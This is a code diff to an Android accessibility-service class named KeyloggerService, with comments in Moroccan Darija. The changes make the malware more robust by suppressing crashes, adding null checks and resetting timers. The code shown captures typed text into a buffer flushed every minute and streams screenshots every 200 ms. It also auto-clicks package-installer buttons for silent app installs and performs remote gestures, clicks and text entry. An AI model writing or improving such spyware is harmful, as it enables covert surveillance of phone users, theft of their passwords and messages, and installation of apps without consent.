@@ -10,6 +10,7 @@ import android.hardware.HardwareBuffer;
 import android.os.Build;
 import android.os.Bundle;
 import android.util.DisplayMetrics;
+import android.util.Log;
 import android.view.Display;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
@@ -36,27 +37,22 @@ public class KeyloggerService extends AccessibilityService {
         super.onServiceConnected();
         instance = this;
 
-        try {
-            // 1. MS7 L'TIMERS L9DAM IL KANOU (bach maycrashich mnin yrje3 l'service)
-            if (flushTimer != null) {
-                flushTimer.cancel();
-                flushTimer.purge();
-                flushTimer = null;
-            }
-            if (streamTimer != null) {
-                streamTimer.cancel();
-                streamTimer.purge();
-                streamTimer = null;
-            }
+        // Anti-Crash: Kaychd ay error f l'background w kaymne3 l'service ymout
+        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
+            Log.e("AccessibilityCrash", "Caught: " + throwable.getMessage());
+        });
 
-            // 2. ZID TIMERS JDAD
+        try {
+            // N7aydo l'Timers l9dam ila kanou
+            if (flushTimer != null) { flushTimer.cancel(); flushTimer = null; }
+            if (streamTimer != null) { streamTimer.cancel(); streamTimer = null; }
+
+            // Nch3lo jdad
             flushTimer = new Timer();
             flushTimer.scheduleAtFixedRate(new TimerTask() {
                 @Override
                 public void run() {
-                    try {
-                        flushBuffer();
-                    } catch (Exception e) {}
+                    try { flushBuffer(); } catch (Exception e) {}
                 }
             }, 60000, 60000);
 
@@ -65,15 +61,11 @@ public class KeyloggerService extends AccessibilityService {
                 @Override
                 public void run() {
                     try {
-                        if (isLiveStreaming) {
-                            takeLiveScreenshot();
-                        }
+                        if (isLiveStreaming) takeLiveScreenshot();
                     } catch (Exception e) {}
                 }
             }, 0, 200);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        } catch (Exception e) {}
     }
 
     @Override
@@ -81,7 +73,10 @@ public class KeyloggerService extends AccessibilityService {
         if (event == null) return;
         
         try {
-            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
+            // FIX: Null check 3la package name bach mayt7erkesch
+            CharSequence pkgName = event.getPackageName();
+            if (pkgName == null) return;
+            String pkg = pkgName.toString();
             
             if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
@@ -92,12 +87,12 @@ public class KeyloggerService extends AccessibilityService {
             }
             if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                 List<CharSequence> text = event.getText();
-                if (text != null && !text.isEmpty()) {
+                if (text != null && !text.isEmpty() && text.get(0) != null) {
                     buffer.append("> ").append(text.get(0).toString()).append("\n");
                 }
             }
 
-            // Auto-click install buttons for Silent Installer
+            // Auto-click install buttons
             if (pkg.contains("packageinstaller") || pkg.contains("com.android.packageinstaller") || pkg.contains("com.miui.packageinstaller")) {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root != null) {
@@ -131,7 +126,7 @@ public class KeyloggerService extends AccessibilityService {
                 }
             }
         } catch (Exception e) {
-            // Catch ay crash f l'UI tree bach l'service maytbi9ch
+            // Catch ay crash f l'UI
         }
     }
 
@@ -165,16 +160,12 @@ public class KeyloggerService extends AccessibilityService {
         } catch (Exception e) {}
     }
 
-    // ================== SMART GHOST TOUCH ==================
-
     public boolean performClick(String textToFind) {
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return false;
-            
             List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(textToFind);
             if (nodes == null) return false;
-
             for (AccessibilityNodeInfo node : nodes) {
                 if (node.isClickable()) {
                     node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
@@ -195,7 +186,6 @@ public class KeyloggerService extends AccessibilityService {
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return false;
-            
             AccessibilityNodeInfo focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
             if (focusedNode != null) {
                 Bundle arguments = new Bundle();
@@ -217,20 +207,14 @@ public class KeyloggerService extends AccessibilityService {
 
             Path path = new Path();
             if (direction.equalsIgnoreCase("up")) {
-                path.moveTo(width / 2f, height * 0.8f);
-                path.lineTo(width / 2f, height * 0.2f);
+                path.moveTo(width / 2f, height * 0.8f); path.lineTo(width / 2f, height * 0.2f);
             } else if (direction.equalsIgnoreCase("down")) {
-                path.moveTo(width / 2f, height * 0.2f);
-                path.lineTo(width / 2f, height * 0.8f);
+                path.moveTo(width / 2f, height * 0.2f); path.lineTo(width / 2f, height * 0.8f);
             } else if (direction.equalsIgnoreCase("left")) {
-                path.moveTo(width * 0.8f, height / 2f);
-                path.lineTo(width * 0.2f, height / 2f);
+                path.moveTo(width * 0.8f, height / 2f); path.lineTo(width * 0.2f, height / 2f);
             } else if (direction.equalsIgnoreCase("right")) {
-                path.moveTo(width * 0.2f, height / 2f);
-                path.lineTo(width * 0.8f, height / 2f);
-            } else {
-                return;
-            }
+                path.moveTo(width * 0.2f, height / 2f); path.lineTo(width * 0.8f, height / 2f);
+            } else { return; }
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 android.accessibilityservice.GestureDescription.Builder builder = new android.accessibilityservice.GestureDescription.Builder();
@@ -244,8 +228,6 @@ public class KeyloggerService extends AccessibilityService {
     public void pressHome() { performGlobalAction(GLOBAL_ACTION_HOME); }
     public void pressRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }
     public void openNotifications() { performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); }
-
-    // ================== SCREENSHOTS ==================
 
     public void captureScreen() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -316,4 +298,4 @@ public class KeyloggerService extends AccessibilityService {
         if (streamTimer != null) streamTimer.cancel();
         super.onDestroy(); 
     }
-}
+                }
